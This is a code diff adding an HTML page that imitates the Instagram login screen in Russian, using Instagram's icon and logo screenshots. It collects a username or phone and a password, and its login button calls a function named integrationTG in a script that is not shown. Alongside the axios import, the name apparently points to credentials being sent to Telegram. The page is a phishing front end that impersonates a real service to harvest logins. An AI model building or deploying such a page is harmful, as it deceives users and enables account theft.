@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="./main.css">
+    <link rel="shortcut icon"
+        href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/768px-Instagram_icon.png"
+        type="image/x-icon">
+</head>
+
+
+<body>
+    <div class="container">
+
+        <div class="wrapper">
+            <div class="wrap-left"><img class="logo-phone" src="./logo/Screenshot 2024-03-30 192252.png" alt=""></div>
+            <div class="wrap-right">
+                <form>
+                    <img src="./logo/Screenshot 2024-03-30 193007.png" alt="">
+                    <input type="text" class="text1" placeholder="Телефон, имя пользователя или эл. адрес">
+                    <input type="text" class="text2" placeholder="Пароль">
+                    <button class="btn" onclick="integrationTG(event)">Войти</button>
+                    <!-- HTML structure to display alert messages -->
+<div id="alertBox" style="display: none; color: red; font-weight: bold;"></div>
+
+                    <div class="orr">
+                        <p class="line"></p>
+                        <p class="or">или</p>
+                        <p class="line"></p>
+                    </div>
+                    <div class="facebook">
+                        <img src="./logo/Facebook_logo__square_-removebg-preview.png" alt="">
+                        <p class="facebook-login">Войти через Facebook </p>
+                    </div>
+                    <p class="forgotten">Забыли Пароль?</p>
+
+                </form>
+            </div>
+
+        </div>
+        <form class="form-2">
+            <p>У вас ещё нет аккаунта? <span class="register">Зарегистририваться</span></p>
+            <div class="app">
+                <p>Установите приложение.</p>
+                <img class="app-foto" src="./logo/Screenshot 2024-03-30 214613.png" alt="">
+            </div>
+        </form>
+
+    </div>
+    
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <script src="./script.js"></script>
+</body>
+
+</html>
